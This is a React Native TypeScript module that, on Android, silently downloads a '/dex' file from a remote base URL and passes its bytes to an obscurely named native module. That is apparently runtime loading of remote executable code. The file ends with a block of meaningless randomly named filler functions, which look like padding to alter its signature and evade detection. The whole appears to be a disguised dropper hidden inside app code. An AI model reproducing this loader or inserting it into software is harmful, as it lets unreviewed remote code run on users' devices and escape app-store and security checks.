/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Ajuvivofewey;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function otubofecani(): boolean {
  const exupiyifin = 84;
  return exupiyifin > 5 ? true : true;
}
function olepeli(): number {
  return 127;
}
function inejuvin(_sosixeteti: number): string {
  let ayirutetukic: string = "oyeqaj";
  ayirutetukic = "somaq";
  return ayirutetukic;
}
function tigapedaq(_icobel: boolean): void {
  const temulopipaw = 74;
  if (temulopipaw > 32) return;
}
function telifepe(_kawane: number, _itilupi: boolean, _aqixabu: number): number {
  const ipuragey = 63;
  return ipuragey > 30 ? 112 : 34;
}
function isafefu(): boolean {
  const xexakufuf = 66;
  const kirawuzote: boolean = false;
  return kirawuzote;
}
function ilujis(_arafelix: number, _acapepega: number): number {
  const iqajefegimut: number = 58;
  return iqajefegimut;
}
/* autopad-end */
